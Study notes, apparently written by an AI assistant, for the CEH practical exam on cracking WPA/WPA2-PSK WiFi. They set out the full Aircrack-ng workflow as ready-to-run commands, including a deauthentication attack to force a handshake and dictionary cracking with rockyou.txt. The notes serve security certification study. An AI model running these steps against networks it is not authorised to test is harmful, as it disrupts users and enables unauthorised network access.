# 📡 WiFi Hacking 101 – CEH Practical Notes

---

## 🔰 Overview

**Goal:** Attack WPA/WPA2 networks  
**Tools:** Aircrack-ng Suite  
**Attack Type:** Brute-force (Dictionary Attack)

---

## 📖 Key Terms (VERY IMPORTANT)

|Term|Meaning|
|---|---|
|SSID|WiFi network name|
|ESSID|Extended network name (multiple APs)|
|BSSID|Access Point MAC address|
|WPA2-PSK|Password-based WiFi|
|WPA2-EAP|Username + Password (RADIUS)|
|RADIUS|Authentication server|

---

## 🔐 WPA2 Authentication

### 🔑 Core Concept → **4-Way Handshake**

✔ Used to verify password  
✔ Password is NEVER directly sent

---

### 🧩 Diagram: 4-Way Handshake

```
Client                Access Point
  | ---- Msg1 ----> |
  | <--- Msg2 ---- |
  | ---- Msg3 ----> |
  | <--- Msg4 ---- |
```

✔ Both prove they know the key  
✔ Used for cracking later

---

## ⚔️ Attack Concept

### WPA2-PSK Attack → **Brute Force**

✔ Capture handshake  
✔ Try passwords from wordlist

---

### ❌ WPA2-EAP

- Cannot use same attack
    
- Requires different techniques
    

---

## 🧠 Key Facts

- Minimum password length → **8**
    
- Attack Type → **Brute Force**
    
- PSK → **Pre-Shared Key**
    

---

# ⚙️ Aircrack-ng Suite

---

## 🔧 Important Tools

|Tool|Purpose|
|---|---|
|airmon-ng|Enable monitor mode|
|airodump-ng|Capture packets|
|aireplay-ng|Deauth attack|
|aircrack-ng|Crack password|

---

## 🧩 Diagram: Attack Workflow

```
Enable Monitor Mode
        ↓
Scan Networks
        ↓
Capture Handshake
        ↓
Deauth Client (optional)
        ↓
Crack Password
```

---

# 🛰️ Step 1: Enable Monitor Mode

---

### ✅ Command

```bash
airmon-ng start wlan0
```

### 📌 Output Interface

```
wlan0mon
```

---

### ⚠️ Kill Conflicting Processes

```bash
airmon-ng check kill
```

---

### 🧩 Diagram

```
Managed Mode → Monitor Mode
   wlan0        wlan0mon
```

---

# 📡 Step 2: Capture Packets

---

## 🔍 Scan Networks

```bash
airodump-ng wlan0mon
```

---

## 🎯 Target Specific Network

```bash
airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon
```

---

### 📌 Important Flags

|Flag|Purpose|
|---|---|
|--bssid|Target AP|
|--channel|Lock channel|
|-w|Save capture|

---

### 🧩 Example

```bash
airodump-ng --bssid 02:1A:11:FF:D9:BD --channel 6 -w capture wlan0mon
```

---

### 🧩 Diagram: Packet Capture

```
WiFi Traffic → airodump-ng → capture.cap
```

---

# ⚡ Step 3: Force Handshake (Optional)

---

## 💣 Deauthentication Attack

```bash
aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

---

### 🧠 Why?

✔ Forces client reconnect  
✔ Generates handshake quickly

---

### 🧩 Diagram

```
Client ──X── AP
   ↓ reconnect
Handshake captured
```

---

# 🔓 Step 4: Crack Password

---

## 🔑 Using Aircrack-ng

```bash
aircrack-ng -b <BSSID> -w /usr/share/wordlists/rockyou.txt capture.cap
```

---

### 📌 Flags

|Flag|Purpose|
|---|---|
|-b|Target BSSID|
|-w|Wordlist|

---

### 🧩 Example

```bash
aircrack-ng -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt capture.cap
```

---

## ⚡ Output

✔ Password found → `greeneggsandham`

---

# 🚀 Hashcat (Faster Cracking)

---

## 📦 Convert Capture

```bash
aircrack-ng -j output capture.cap
```

✔ Creates `.hccapx` file

---

## 🔥 Why Hashcat?

- Uses GPU
    
- Much faster than CPU
    

---

### 🧠 CPU vs GPU

|Device|Speed|
|---|---|
|CPU|Slow|
|GPU|Fast 🚀|

---

# 🎯 Practice Command (Wordlist Sampling)

---

## Generate Random Passwords

```bash
head /usr/share/wordlists/rockyou.txt -n 10000 | shuf -n 5
```

---

# ⚠️ Requirements

---

## 📡 Hardware

- Monitor mode NIC (VERY IMPORTANT)
    
- Injection support (for deauth)
    

---

# 🧠 Full Attack Flow (Exam Ready)

---

```
1. airmon-ng check kill
2. airmon-ng start wlan0

3. airodump-ng wlan0mon

4. airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon

5. aireplay-ng --deauth 10 -a <BSSID> wlan0mon

6. aircrack-ng -b <BSSID> -w rockyou.txt capture.cap
```

---

# 🧾 Quick Revision Cheat Sheet

---

## 🔥 Commands

```bash
airmon-ng start wlan0
airmon-ng check kill

airodump-ng wlan0mon
airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon

aireplay-ng --deauth 10 -a <BSSID> wlan0mon

aircrack-ng -b <BSSID> -w rockyou.txt capture.cap

aircrack-ng -j output capture.cap
```

---

## 🧠 Key Points

- WPA2 → Uses 4-way handshake
    
- Attack → Brute force
    
- Need → Handshake capture
    
- Faster → GPU (hashcat)
    

---

## ❌ Common Mistakes

- ❌ No monitor mode
    
- ❌ Wrong channel
    
- ❌ No handshake captured
    
- ❌ Weak wordlist
    

---

# 🏁 Final CEH Strategy

---

1. Enable monitor mode
    
2. Scan network
    
3. Lock target BSSID + channel
    
4. Capture handshake
    
5. Force deauth (if needed)
    
6. Crack with wordlist
    
7. Use Hashcat if slow
    

---

If you want next level prep, I can give you:

- 🧪 **Real CEH WiFi practical scenarios**
    
- ⚡ **Top 20 WiFi commands cheat sheet**
    
- 🧠 **Viva questions + answers (very important for CEH)**